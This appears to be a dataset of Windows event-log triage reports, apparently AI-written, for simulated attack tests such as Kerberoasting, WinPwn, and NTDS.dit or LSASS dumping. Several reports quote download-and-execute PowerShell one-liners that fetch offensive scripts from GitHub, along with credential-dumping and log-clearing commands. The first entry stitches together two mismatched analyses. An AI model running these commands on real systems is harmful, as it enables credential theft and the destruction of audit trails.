Password Brute User using Kerbrute Tool,"## Analysis Summary:

The provided logs contain multiple events from different channels including Windows PowerShell, System, Application, Security, and Sysmon logs. Several entries indicate suspicious activities that could be indicative of malicious activity. Here is a detailed analysis of the events:

### Windows PowerShell Log:
- **PowerShell Activity (Event ID 600):**
    - A PowerShell script execution is using a tool named `kerbrute.exe`. The command-line for this involves a brute-force attack against a user (`TestUser1`) in the Active Directory domain. This is a strong indicator of unauthorized or malicious activity as `kerbrute.exe` is known for Kerberos brute-forcing.
    - PowerShell execution has been initiated by the `admin_test` account, which indicates elevated privileges use to potentially gain unauthorized access.

### System Log:
- **Log File Cleared (Event ID 104):**
    - The System and Windows PowerShell logs have been cleared by the user `admin_test`. Clearing event logs is often an action taken by malicious actors to cover their tracks after launching compromising operations.

### Security Log:
- **Security Log Cleared (Event ID 1102):**
    - This is a crucial indicator of malicious behavior. The clearing of security logs often indicates an attempt to erase traces of unauthorized access or operations.

### Sysmon Log:
- **Process Execution:**
    - Multiple entries reveal the execution of suspicious commands by the `admin_test` user, such as the use of `wevtutil.exe` (which was used to clear logs as observed in other logs).
    - Execution of potential malware-related tools like `kerbrute.exe` as seen in the PowerShell log is logged here with comprehensive details such as hashes, indicating potential security audit concern.

### Application Log:
- **Antivirus State:**
    - Logs show that Windows Defender was operational; however, there was no indication of it acting against potential threats. This might indicate evasion techniques or usage of tools that are not flagged by the antivirus.

### Overall Threat Assessment:

The combination of unauthorized PowerShell usage to run credential brute-forcing tools, the clearing of event logs by a user with administrative privileges, along with the nature and timing of the executed processes, makes this activity highly suspicious and indicative of malicious intent.

### Recommendation:

1. **Immediate Action:**
   - **Isolate** the host (Server002) from the network to prevent potential lateral movement and further malicious activities.
   - **Review** user `admin_test` and related credentials for compromise. Consider resetting credentials and increasing monitoring.

2. **Investigation:**
   - Conduct a full forensic analysis on Server002 to determine the extent of the compromise and identify any further malicious tools or scripts deployed.
   - Assess other systems for similar indicators to detect further spread.

3. **Long-term Measures:**
   - Implement stricter access controls/logging and PowerShell usage policies.
   - Strengthen incident response protocols and security posture (e.g., deploy EDR solutions that can provide deeper visibility and automated responses).

### Conclusion:

Based on the logs and indicators present, the final determination is:

**Resolution: MALICIOUS** - The logs exhibit clear signs of malicious activities with intent to compromise credentials and maintain persistence while attempting to cover tracks by clearing system logs. Immediate containment and thorough investigation are essential."

### Summary of Findings

Upon analysis of the given logs, there are several activities and events that suggest potential malicious behavior. Notable actions were identified, particularly around the use of PowerShell to download and execute potentially harmful scripts, and attempts to clear event logs. 

### Indicators of Compromise (IoCs)

1. **PowerShell Activity**:
   - **Command Execution**: There are PowerShell events (`EventID 600`) indicating the execution of the command chain involving `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')`. This command downloads and executes a PowerShell script `Invoke-Rubeus.ps1` which is well known in security circles for Kerberos-related attacks, such as ticket extraction and pass-the-ticket attacks.
   - **Command Content**: This script execution includes specific commands that could perform Kerberoasting attacks: `Invoke-Rubeus -Command ""kerberoast /format:hashcat /nowrap""`. This indicates a clear attempt to harvest passwords for brute-force attacks.

2. **Clearing of Event Logs**:
   - **EventID 1102 (Security Log Cleared)**: The security log was cleared by the user `admin_test`, which is suspicious activity typically associated with attempting to hide traces of malicious actions.
   - **System Log Cleared Event**: Similarly, there are events in the system log indicating the clearing of logs by the same user. This action aligns with efforts to remove evidence of unauthorized or potentially malicious activity.
   
3. **Time Change Events**:
   - **EventID 4616 (System Time Changed)**: There are multiple system time change events in quick succession which could indicate an attempt to bypass time-based security mechanisms.

4. **Svchost and Wevtutil Usage**:
   - The execution of `wevtutil.exe` commands to clear specific logs indicates intent to disrupt monitoring or forensic analysis.

### Assessment

The observed PowerShell activity downloading and executing suspicious scripts, coupled with the clearing of event logs, suggest that this server is likely compromised. The presence of known attack tools being invoked through PowerShell scripting indicates a significant risk.

### Threats or Risks Identified:
- Credibility Compromise: Access to potentially sensitive Kerberos tickets can lead to lateral movement and credential theft across the network.
- Evidence Obfuscation: Recurrent clearing of logs attempts to hide the attacker’s footprint, complicating incident response efforts.
  
### Recommended Actions

- **Immediate Isolation**: The infected host (Server002) should be immediately isolated from the network to prevent further spread and damage.
- **Incident Response Initiation**: Engage a full incident response team to investigate the extent of the compromise.
- **Log Analysis**: Use backup or centralized log repositories to analyze detailed audit trails before the log clearing events.
- **Credential Integrity Checks**: Reset all credentials associated with potentially exposed accounts, particularly accounts with elevated privileges like `admin_test`.
- **Forensic Imaging**: Capture a forensic image of the compromised system for a detailed malware analysis.
- **Strengthening Monitoring**: Enhance monitoring for similar PowerShell activity and unexpected log clearing on other systems.

### Resolution: MALICIOUS

The provided event logs indicate clear signs of a malicious activity with the use of PowerShell to download and execute potentially harmful scripts, and efforts to clear logs to conceal these activities. Further investigation and response are highly recommended."
Extract all accounts in use as SPN using setspn,"After reviewing the provided logs, several points of interest suggest potential malicious activity:

1. **Powershell Activity:** The logs show a Powershell session being initiated (""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"") by ""SERVER002\\admin_test."" Powershell execution can be a red flag if not part of routine administrative tasks, especially if automated scripts or commands are not documented or necessary for the time in which they occur.

2. **Wevtutil Executions:** Multiple instances of ""wevtutil.exe"" being executed to clear event logs are found. The command ""cl"" (clear) is explicitly used against several logs like ""Sysmon/Operational"", ""Application"", ""System"", and ""Security."" This action can be indicative of an attempt to cover tracks after potentially malicious activity since attackers commonly clear event logs to remove traces of their actions.

3. **Log Clearing Events:**
   - Security logs entry 1102 indicates that the logs were cleared by the user ""SERVER002\\admin_test."" It is suspicious when combined with the other logged command executions meant to manage or manipulate event logs.

4. **Time Skew Events:** There are entries (EventID 4616) indicating system time changes by the ""LOCAL SERVICE."" Sudden changes to the system time can be part of an attempt to manipulate timestamps and evade detection in security logs.

5. **Command-Line Usage:** A command executed via ""cmd.exe"" querying Service Principal Names (SPNs) with ""setspn.exe"" does not seem aligned with regular task usage and might indicate reconnaissance steps typically related to domain/impersonation attacks.

Conclusions and Next Steps:
- **Resolution: MALICIOUS**: The combination of these events, specifically the clearing of logs, the initiation of Powershell, and command-line queries that align with reconnaissance techniques, strongly indicates malicious intent.
- **Guidance on How to Proceed:**
  - **Immediate User Investigation:** Check the usage history of the user ""SERVER002\\admin_test."" Verify if this activity aligns with their typical processes or raises any suspicions around credential misuse.
  - **System Review:** Isolate the affected system from the network to prevent further spread or access. Examine it for additional compromise indicators, such as unauthorized software installs or unexpected changes in configuration.
  - **Incident Response:** Initiate an organization-wide incident response, review other systems for similar indicative patterns, especially looking into missing or unexpectedly cleared logs on other systems.
  - **Strengthen Monitoring:** Ensure enhanced monitoring for Powershell usage, particularly its logging and behaviors connected to high-level users like administrators. Deploy prevention and detection tools for command-line activity and event log management.
"
WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords,"Upon analyzing the provided event logs, several activities suggest potential malicious behavior on the Windows host:

1. **Unauthorized Log Clearing:**
   - The Security log event with `EventID 1102` indicates that the Security logs were cleared by the user `admin_test`. This action is often associated with attempts to cover up unauthorized activities.
   - The Sysmon log also shows a sequence of events where different event logs (Security, Application, System) were cleared using the `wevtutil.exe` command, executed by the same user, `admin_test`. This user had escalated privileges, including `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, among others, which are significant for performing sensitive operations.

2. **Suspicious PowerShell Execution:**
   - A PowerShell script executed by `powershell.exe` is observed in the Sysmon and Windows PowerShell logs. The command line includes downloading and executing a script from an external source, `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. This script appears to perform operations that could decrypt TeamViewer credentials, which is highly suspicious and indicative of malicious intent.

3. **Time Manipulation:**
   - The System logs show changes in system time (`EventID 4616` and Kernel-General events), which could be an attempt to disrupt log sequencing and interfere with log forensics.

These activities exhibit strong indicators of compromise:

- The clearing of various logs strongly suggests attempts to hide malicious activities.
- The execution of potentially malicious PowerShell scripts from an untrusted external source further underscores the likelihood of malicious intent.
- The manipulation of the system clock could be employed as a subterfuge technique to make log review more challenging and alter timestamps related to unauthorized activities.

**Resolution: MALICIOUS**

Given the analysis, the actions logged are 100% malicious. It is recommended to immediately isolate the affected system from the network for a detailed forensic investigation. Additionally, consider resetting credentials and reviewing security policies related to log retention and user access to administrative privileges. The security team should further investigate the origin and intent of the executed PowerShell script."
WinPwn - Snaffler,"Upon analyzing the provided logs, the following findings are noted:

1. **PowerShell Execution and Script Download**:
   - There is a clear execution of a PowerShell command that is designed to download and execute a script from a GitHub repository. The command `""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), Snaffler -noninteractive -consoleoutput}` appears in the logs. This is suspicious as it involves downloading and executing a script directly from an external source.

2. **Log Clearing Events**:
   - There's evidence of the security, system, and Windows PowerShell logs being cleared, as indicated by `EventID: 104` in the System log and `EventID: 1102` in the Security log. This activity is typically indicative of malicious intent or an attempt to cover tracks.

3. **Multiple High-Integrity PowerShell Commands**:
   - The PowerShell activity is executed with high integrity levels by the user `SERVER002\admin_test`. This suggests administrative privileges, adding to the risk level of the commands being executed.

4. **Other System Activities**:
   - There are various benign activities such as Microsoft Edge Updates and svchost.exe operations, which are legitimate system operations and typical behavior for a Windows system. However, they do not offset the impact of the suspicious PowerShell activity.

Based on the above observations, the logs indicate potentially malicious activity, primarily due to the PowerShell command downloading a script from the web and clearing of the logs, which is a common behavior seen in post-exploitation phases of an attack.

**Resolution: MALICIOUS**

**Guidance on How to Proceed**:
- **Immediate Containment**: Disconnect the affected system (`Server002`) from the network to prevent further potential spread or data exfiltration.
- **Investigate the Source**: Determine how the malicious script was introduced and if any other systems are affected.
- **Log Analysis**: Check for other systems using similar PowerShell activities or connected to similar IP sources.
- **Patch and Remediate**: After ensuring all threats have been neutralized, update system security measures, apply necessary patches, and enhance monitoring systems.
- **Educate and Alert**: Inform users about the incident to raise awareness and prevent similar future activities."
Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config),"Upon analyzing the provided Windows event logs, several indicators suggest potentially malicious activity. Let's break this down starting with indicators present in various log categories:

### Indicators of Potential Malicious Activity:

1. **Clearing Event Logs**:
   - The security logs indicate that the `admin_test` user cleared the logs (`EventID 1102` in the Security log) at 2024-10-20 17:17:45. This is often a behavior associated with malicious actors attempting to cover their tracks on a compromised system. The clearing of the logs is corroborated across both Security and System logs (`EventID 104` for Windows PowerShell, System logs, and Security logs).

2. **Use of `wevtutil.exe`**:
   - In the Sysmon logs, the execution of `wevtutil.exe` with `CommandLine` parameters targeting different log channels (""Security"", ""System"", ""Application"", and ""Windows PowerShell"") is recorded. This further reinforces the indication that logs were being cleared deliberately using this tool.

3. **PowerShell Activity**:
   - PowerShell logs exhibit process execution (`EventID 600`) with the command `powershell.exe & {C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config}` initiated by the `admin_test` user. This command itself is not inherently malicious, but combined with other suspect activities, it raises concerns about what might have been intended.

4. **Process Execution**:
   - Sysmon captured various command-line executions that include `whoami.exe` and `hostname.exe`, utilities often used by attackers to gather information about a system. 
   - The rapid execution of multiple `conhost.exe` processes associated with these commands might point towards attempts at scripting techniques to automate tasks or execute commands quietly.

### Assessment:

The logs demonstrate potentially malicious behavior primarily due to the clearing of logs via `wevtutil.exe`. This is a significant indicator of compromise, especially when executed by a user with administrative privileges. The combination of log clearing, utility commands (`whoami`, PowerShell executions), and process actions conducted sequentially by `admin_test`, forms a concerning pattern of activity.

### Resolution:

- **MALICIOUS**: The activities, particularly the deliberate clearing of logs and execution of `wevtutil.exe`, indicate actions strongly associated with malicious intentions aimed at covering traces or executing hidden actions on the system.

### Guidance on How to Proceed:

1. **Immediate Isolation**: Consider isolating the affected machine from the network to prevent further unauthorized activities or data exfiltration.
   
2. **Conduct a Forensic Analysis**: Perform a detailed forensic analysis to discover the extent of the compromise, including examining other potentially affected systems, collecting memory dumps, and reviewing historical logs for additional context.

3. **User Account Review**: Investigate the `admin_test` user account for suspicious logins and validate any abnormalities in its use, including checking VPN logs and access logs.

4. **Patch and Harden the System**: Ensure that all software is up to date, review and enhance security configurations, and consider implementing stricter logging mechanisms, such as preventing unauthorized clearing of logs.

5. **Prepare for Legal Action**: Depending on findings, consider involving legal counsel or law enforcement, particularly if customer data or sensitive information is suspected to have been accessed or exfiltrated."
Simulating access to Chrome Login Data,"Upon analyzing the provided Windows event logs, several indicators of suspicious and potentially malicious activity are evident:

1. **Event Log Clearance:**
   - System Event Log [EventID 104] and Security Event Log [EventID 1102] indicate that logs for the System, Security, and Windows PowerShell channels were cleared by the user `admin_test` at ""2024-10-27 21:32:10"". Clearing event logs can be a tactic used by malicious actors to cover their tracks after illicit activities.

2. **Suspicious PowerShell Activity:**
   - There are multiple PowerShell events indicating that PowerShell commands were executed to copy files potentially containing sensitive data (Chrome's Login Data) to a temporary folder. The command uses system environment variables to target Chrome user data, which can be indicative of attempts to exfiltrate login credentials. The use of `powershell.exe` for data exfiltration is a common tactic among attackers.

3. **Unexpected Command Line Executions:**
   - Several `wevtutil.exe` processes are launched to clear logs (`cl` command-line option), specifically targeting Microsoft-Windows-Sysmon/Operational, Application, Security, and Windows PowerShell logs. These entries are all executed under the user `admin_test`, coinciding with the log clearance entries which suggest an attempt to delete any traces of malicious actions.

4. **Sysmon Outputs:**
   - The Sysmon logs correlate with the PowerShell and log-clearing activities, showing processes starting for `powershell.exe` and `wevtutil.exe` related to the behavior described above. These activities are logged as processes initiated by `admin_test` having high integrity levels, which suggests elevated privileges.

5. **Security Events:**
   - Security Event [EventID 4624] showing a logon event for SYSTEM user using `Advapi` logon process with elevated token privileges captured right after the logs are cleared. It suggests an authorized but suspiciously timed system-level access.

Given these observations, the collected evidence suggests a high likelihood of compromise. The sequence of log clearances, the copying of potentially sensitive data using PowerShell, and the timing of privileged SYSTEM account activities are strong indicators of malicious intent. 

### Resolution: MALICIOUS

### Guidance:
- **Immediate containment:** Isolate the affected system (Server002) from the network to prevent further malicious activity or data exfiltration.
- **Forensics:** Perform a thorough forensic analysis on Server002 to understand the extent of the breach, focusing on any additional backdoors, malicious scripts, or data loss.
- **Audit Other Systems:** Check other systems for similar activities, as attackers might have moved laterally.
- **Review Permissions:** Examine and tighten permissions, especially privileged accounts, and ensure comprehensive log monitoring is in place to prevent future incidents.
- **User Awareness:** Educate users on recognizing malicious activities, especially suspicious system changes or unauthorized command executions.

The actions taken by the person using `admin_test` appear consistent with malicious behavior aimed at gaining unauthorized access and possibly exfiltrating sensitive information."
Create Volume Shadow Copy with vssadmin,"Upon reviewing the provided Windows event logs, there are a few entries that stand out and warrant closer examination for potential indicators of malicious activity:

1. **Clearing Event Logs**: 
   - Security Event 1102 indicates that the security event log was cleared by a user ""admin_test"" at `2024-10-20 20:04:21.4660016`. Clearing event logs is a common tactic used by malicious actors to hide their tracks.

2. **Execution of Wevtutil for Clearing Logs**:
   - Sysmon Logs show multiple instances of the `wevtutil.exe` command being executed to clear various logs (e.g., Microsoft-Windows-Sysmon/Operational, Security, Application, System, Windows PowerShell). This corroborates the log-clearing behavior seen in the Security logs.
   - The user `admin_test` executed these commands, which is concerning especially if they are not part of regular administrative maintenance activities.

3. **Use of Vssadmin.exe**:
   - Several Sysmon logs indicate the execution of the command `vssadmin.exe create shadow` by the user `admin_test`. This can be benign in some environments for creating shadow copies but is also known to be used in ransomware operations to manipulate shadow copies for data recovery prevention.

4. **Registry Queries and CMD Execution**:
   - Sysmon events show `cmd.exe` executing registry queries that may align with setup or configuration changes (e.g., querying `ProductOptions`). While this might not be inherently malicious, it could potentially indicate system reconnaissance or automated tasks.

5. **Credential Access Attempts**:
   - Security event 5379 indicates failed access attempts to MicrosoftAccount:user related credentials with error code `3221226021`. Although failed, repeated attempts could indicate malicious activity or misconfiguration.

6. **Presence of Standard Security Tools**:
   - Application logs show that Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`), which is a positive indication of some security controls being in place.

Overall, the collection of activities, especially the clearing of logs and the execution of commands often utilized in attacker tactics, strongly suggests potential malicious actions. However, without additional context, such as network logs or alerts from intrusion detection systems, this cannot be confirmed with absolute certainty.

**Resolution Recommendation:** SUSPICIOUS

**Guidance on How to Proceed:**
- Conduct a thorough investigation to determine if the user account ""admin_test"" should have performed the actions observed, especially log clearing and vssadmin usage.
- Implement alerting for similar future activities, particularly log clearing and the use of administrative tools.
- Review access management to ensure that administrative privileges are appropriately assigned and monitored.
- Consider a full security audit of ""Server002"" to check for potential backdoors or further malicious configurations.
- If possible, restore recent backups to ensure system integrity if malicious activity is confirmed."
Copy NTDS.dit from Volume Shadow Copy,"Upon analyzing the provided Windows event logs, several indicators suggest potentially malicious activity, which warrants a deeper investigation. Here's a detailed breakdown of the suspicious events identified:

- **Log Cleared Events**: There are multiple instances of logs being cleared (EventID: 1102 in Security log and EventID: 104 in System log), executed by the user ""admin_test"". This behavior is often associated with an attempt to cover tracks after malicious activity, as clearing log files can erase records of potentially harmful operations.

- **Unexpected Command Execution**: 
  - **PowerShell Activity**: A command involving ""Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'"" was executed. This is indicative of a common set of tactics used by attackers to maintain persistence, execute privilege escalation attempts, or perform data exfiltration.
  - **Suspicious CMD Commands**: Execution of commands to copy sensitive files such as NTDS.dit and SYSTEM hive from the volume shadow copies (""copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\..."") resembles typical data-stealing activities as attackers often target these files for credential and data extraction.

- **Elevation of Privileges**: There was a privileged operation logged (EventID: 4672) involving SYSTEM-level privileges like ""SeDebugPrivilege"" and ""SeTakeOwnershipPrivilege"" allowing processes to debug other processes or take ownership of files, often indicating illegitimate privilege escalation.

- **File and Registry Manipulation**: Use of `reg.exe` to save system registry hives to a temporary directory is abnormal and further suggests data gathering for potentially malicious purposes.

- **Anonymous or SYSTEM Level Operations**: Many processes of interest (such as WmiPrvSE.exe, svchost.exe) were executed under the context of NT AUTHORITY\SYSTEM, suggesting potential misuse of inherently trusted system processes.

Overall, the combination of log-clearing activities, indicative command-line usages associated with known attack patterns, potential privilege escalation, and access/modification of sensitive files suggest these logs are not just anomalous but more likely indicative of malicious activity.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
1. **Immediate Monitoring and Isolation**: Increase monitoring on the affected host, especially looking for any outbound connections, lateral movement, and further data exfiltration attempts.
2. **Conduct a Comprehensive Audit**: Investigate other hosts and systems in the environment for similar patterns or indicators of compromise.
3. **Review and Strengthen Security Posture**:
    - Revise user account permissions and audit use of service accounts.
    - Deploy further endpoint protection measures and consider endpoint detection and response (EDR) solutions.
4. **Incident Response**: Engage with incident response teams to analyze the scope of the breach and implement containment, eradication, and recovery steps.
5. **Report and Preserve Evidence**: Compile a report of findings, preserve related logs and artifacts for forensic purposes, and consider involving law enforcement if needed."
Dump LSASS.exe Memory using direct system calls and API unhooking,"Upon reviewing the provided Windows event logs, several indicators of potentially suspicious or malicious activity stand out. Here is a detailed analysis:

1. **Log Clearing Actions**: 
   - Multiple instances of Event ID 104 (""LogFileCleared"") for System, Windows PowerShell channels, and Event ID 1102 (""Event Log Cleared"") for the Security channel are observed. These actions were performed by the user ""admin_test"". Log clearing actions, especially when done simultaneously across different log channels, are often associated with attempts to cover up other malicious activities and should be considered suspicious.

2. **High Integrity Level Activities**:
   - There are multiple instances where processes are initiated with a high integrity level by ""SERVER002\\admin_test"". This includes the `wevtutil.exe` tool being used to clear logs, which is critical because it indicates that the user had sufficient privileges to perform these potentially destructive acts.

3. **Unusual Process Execution**:
   - The execution of `cmd.exe` with a command-line argument attempting to run `Outflank-Dumpert.exe`, which is a known tool used to dump credentials, suggests an attempt to capture sensitive information from the system.
   - The presence of `AtomicRedTeam` within the command paths suggests potential emulation of known attack techniques, which could be benign if used during authorized red-teaming exercises or malicious if executed without authorization.

4. **Background and Context**:
   - The use of tools like `whoami.exe`, `powershell.exe`, and `wevtutil.exe` in close succession could indicate a script or individual attempting reconnaissance or system manipulation.
   - The combination of log clearing events, credential dumping tool execution, and the use of process monitoring tools within a short time frame indicates a sequence of events typical of post-exploitation activities.

**Assessment and Resolution**:
- **SUSPICIOUS** - The activities recorded in the logs suggest potentially unauthorized actions that warrant further investigation. The presence of log clearing actions coupled with the execution of a known credential dumping tool without context for legitimate usage could potentially indicate a breach or malicious activity. I recommend conducting interviews with relevant personnel, verifying the intent and authorization for these actions, and closely monitoring any future activities from the account ""admin_test"". Further, a security audit should be conducted to ensure no unauthorized access has been established."
Gsecdump,"**Analysis of Windows Event Logs**

Upon reviewing the Windows event logs from the system ""Server002,"" multiple indicators strongly suggest potential malicious activity. Here's the detailed analysis:

1. **Log Clearing Activity:**
   - **System Log Entry (EventID 104):** There are events indicating that the ""System"" and ""Windows PowerShell"" logs were cleared by the user ""admin_test"" at `2024-10-20 17:05:10`. This behavior is suspicious as clearing event logs is a common tactic used by attackers to cover their tracks.

2. **Suspicious Process Executions:**
   - **Sysmon Log Entry (EventID 1):** The process `wevtutil.exe` was executed multiple times by the same user `SERVER002\admin_test` with the command lines indicating logs for various channels were cleared (e.g., Sysmon, Application, Security, and PowerShell). This is highly indicative of an attempt to remove traces of potentially malicious actions.
   - **Command Execution via cmd.exe:** The logs indicate that `cmd.exe` was used to execute a potentially malicious payload (`gsecdump.exe`), which is known to extract security-related information like password hashes. This action, particularly executed from a temporary directory, often implies malicious intent.

3. **Security Concern:**
   - **Security Log Entry (EventID 1102):** The Security event log being cleared is another red flag for suspicious activity as it suggests attempts to delete traces concerning security-related events logged by the system.
   
4. **Failed Credential Operations (EventID 5379):** Multiple failed attempts related to account access were logged under the ""Security"" channel, pointing towards potential unauthorized access attempts or misconfigured operations.

5. **Integrity Level and User Context:** Most of the actions were performed under a high integrity level by the user ""admin_test,"" which would likely require administrative privileges, hinting at either an insider attacker or one who escalated privileges to an administrative level.

**Assessment:**
Given the combination of log clearance, execution of a password extraction tool, high integrity level for processes, and the administrative context of the actions, the observed events represent indications of possible compromise.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Containment:**
   - Isolate the affected host to prevent further access or control by the attacker.
   - Reset credentials for the affected accounts and explore if any other accounts may have been compromised.
   
2. **Deeper Investigation:**
   - Perform full disk forensics on the host to trace back to the initial access point.
   - Review backups for signs of corruption or compromise.
   - Examine network logs and other hosts for lateral movement or further compromise.

3. **Mitigation and Remediation:**
   - Patch known vulnerabilities across the system.
   - Reinforce least privilege access controls to prevent excessive rights.
   - Enhance monitoring and logging capabilities to detect similar future events promptly.

4. **Incident Reporting:**
   - Document all findings and actions taken, and report to relevant internal or external parties as per incident response protocols."
Brute Force Credentials of single Active Directory domain users via SMB,"Upon reviewing the event logs provided, several indicators of suspicious and potentially malicious activity were identified. Here's the detailed analysis:

1. **Event Log Clearing**:
   - **Events 104 and 1102 in the System and Security logs respectively**: The logs show instances where the Windows Event Log was cleared. The user `admin_test` was involved in this action. This is a key indicator of malicious activity since attackers often clear logs to erase their footprints after compromising a system. The fact that logs from the Security and Windows PowerShell channels were cleared is highly suspicious.

2. **Suspicious Command Execution**:
   - **Sysmon Event ID 1 with Process Image `C:\\Windows\\System32\\cmd.exe`**: The specific command executed is designed to create a 'passwords.txt' file that stores multiple passwords and attempts to use them for network logins. This behavior resembles a brute-force attack or an attempt to gather valid credentials on the network.
   - The use of commands like `whoami.exe`, `hostname.exe`, and `net.exe` is observed, which may suggest reconnaissance activities intended to gather system and network details.

3. **Privilege Assignment**:
   - **Event ID 4672 in the Security log**: This event indicates that user `admin_test` was assigned high-level privileges (e.g., `SeDebugPrivilege`, `SeBackupPrivilege`). This could be a sign of privilege escalation attempts, where the user might not have originally had these privileges.

4. **Involvement of Administrative Accounts**:
   - Multiple log entries involve the use of the account `admin_test`, and several processes executed with high integrity levels. The high frequency of events implicating this account suggests it may have been exploited or become the point of entry for malicious activity.

5. **Processes with System User**:
   - Repetitive instances of processes running by `NT AUTHORITY\\SYSTEM` such as `svchost.exe`, `MicrosoftEdgeUpdate.exe` are seen. While `svchost.exe` is normal under this user, seeing it in conjunction with other suspicious activities could be a part of post-exploitation activities.

**Assessment**:
- Based on the analysis of log clearing activities, suspicious command line entries, and the execution of processes using high integrity levels including `cmd.exe` attempting network shares with multiple passwords, it indicates malicious behavior. The combination of these actions supports the theory of compromised security.

**Resolution**: 
- **MALICIOUS**: The findings show strong signs of a security breach. Immediate action is required to secure the system, including isolating the affected machine, conducting a thorough forensic analysis, rotating all potentially compromised credentials, and reviewing and enhancing security measures across the network.

### Guidance on How to Proceed:
- Isolate the affected system(s) from the network to contain the breach.
- Conduct a thorough forensic analysis of the system to identify the scope and source of the breach.
- Reset passwords and review privilege settings for all user accounts, especially those with administrative access.
- Implement additional monitoring and Intrusion Detection/Prevention Systems (IDS/IPS) to alert and respond to suspicious activities swiftly.
- Ensure system and security patches are up-to-date to mitigate vulnerabilities.
- Conduct an in-depth security review and user training to enhance awareness and prevent future breaches."
WinPwn - DomainPasswordSpray Attacks,"Upon reviewing the provided Windows event logs, the following observations and analysis were made:

### Security Log

1. **Event ID 1102**: This event indicates a log file clearing activity, specifically of the Security log. This is often a red flag as attackers may clear event logs to cover their tracks. The user `admin_test` was responsible for this action, logged in from `SERVER002`.

### Sysmon Log

1. **Process Execution of `wevtutil.exe`**: Multiple instances of `wevtutil.exe` are observed with command-line arguments indicating the clearing of logs from various channels, including Sysmon, Application, and Security channels. This utility is often used in nefarious activities to delete event logs to obfuscate malicious actions.

2. **PowerShell Activity**: The execution of `powershell.exe` with a command attempting to download and execute a script from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1` is highly suspicious. This script likely contains malicious actions, as it is downloaded from the web without any integrity checks and executed in one step.

### System Log

1. **Event ID 104**: Instances of this event in the System log denote the clearing of event logs for the System and Windows PowerShell channels by the same `admin_test` user. This complements the suspicious activity noted in the Security log and Sysmon log.

### Windows PowerShell Log

1. **PowerShell Engine Starting and Stopping**: The event IDs 600 and 403 indicate a PowerShell session starting and stopping, respectively, using the command line that involves downloading and executing a script. The presence of this script execution, especially with the context of other events, signals potential malicious activity.

### Overall Assessment

The logs exhibit clear indicators of malicious activity:

- The clearing of multiple channels of logs (Security, Sysmon, Application, System, Windows PowerShell) concurrently.
- Execution of `powershell.exe` with the intention to download and run potentially malicious scripts.
- The use of high-integrity PowerShell commands, which further adds to the suspicion of privilege abuse.
- The specific combination and sequence of these activities strongly suggest an attempt at covering tracks following potentially unauthorized or malicious operations.

### Recommendation

Resolution: **MALICIOUS**

Given the evidence of log clearing, suspicious PowerShell script execution from the internet, and misuse of legitimate utilities for potentially covering attacker trails, these logs indicate a high likelihood of malicious activity. It is critical to:

1. Immediately isolate the affected system (Server002) to prevent further potential compromise.
2. Conduct a thorough forensic investigation to determine the extent of the intrusion.
3. Analyze the downloaded PowerShell script to understand its behavior fully.
4. Review user `admin_test`'s actions and potentially revoke access pending investigation results.
5. Implement an incident response plan, including notification to stakeholders and senior security personnel. 

Additionally, improving monitoring and implementing advanced threat detection solutions could help in identifying and mitigating such threats promptly in the future."
WinPwn - Kerberoasting,"### Analysis:

Upon reviewing the provided collection of logs, several events indicate suspicious, and potentially malicious, activity on the Windows host (Server002). Here’s a breakdown of the suspicious findings:

1. **PowerShell Usage for Script Execution**:
   - The Sysmon logs and Windows PowerShell logs capture the execution of a PowerShell command that downloads and executes a script from a GitHub repository associated with potentially malicious activity (S3cur3Th1sSh1t/WinPwn/WinPwn.ps1). This script appears to be used for ""Kerberoasting"", a technique that could be used for privilege escalation by extracting service account credentials from Kerberos tickets.
   - PowerShell logs (Event ID: 600, 403, 400) reveal the execution of a command designed to download and execute this script with specific flags for non-interactive use, indicating a potential automated malicious action.

2. **Event Log Clearing**:
   - Security logs (Event ID: 1102) and Sysmon logs indicate the clearing of event logs, specifically the Security and System logs, by the user `admin_test`. Clearing logs is a common tactic used by attackers to cover their tracks after compromising a system.

3. **Execution of Host System Commands**:
   - The logs also show repeated execution of system utilities like `wevtutil.exe`, `whoami.exe`, and `hostname.exe` by the same user `admin_test`. While these tools can be used for legitimate administrative purposes, when combined with the PowerShell activity, they become suspicious.

4. **Time Change Events**:
   - The System logs capture an unexpected time change on the server (Event ID: 4616), which could be part of an attack to manipulate time-based security controls, though the exact impact is unclear without more context.

5. **Microsoft Edge Update Anomalies**:
   - Numerous logs detail the execution of Microsoft Edge Update processes. While software updates can trigger such activity, the volume and timing close to the malicious PowerShell execution could potentially be leveraged as camouflage or in further stages of an attack sequence.

### Conclusion:

Based on the logs analyzed, the activities observed, especially the execution of a potentially malicious PowerShell script and the clearing of event logs, clearly indicate malicious activity. The behavior matches known patterns of attack involving credential harvesting and covering tracks.

### Resolution: MALICIOUS

### Guidance:

1. **Isolate the Affected System**: Immediately isolate Server002 from the network to prevent further potential spread or data exfiltration.

2. **Conduct Further Forensics**: A deeper forensic analysis is necessary to understand the full scope of the compromise, including memory analysis and checking for persistence mechanisms.

3. **Change Credentials**: Immediately change passwords for any user accounts that were active or available on the compromised system, especially those with elevated privileges.

4. **Review and Strengthen Security Posture**: Utilize threat intelligence to search for additional indicators of compromise across your environment, increase monitoring, and educate staff on the risks associated with PowerShell misuse.

5. **Reimage and Restore**: Plan for a complete reinstallation of the affected system from a clean backup, if necessary."
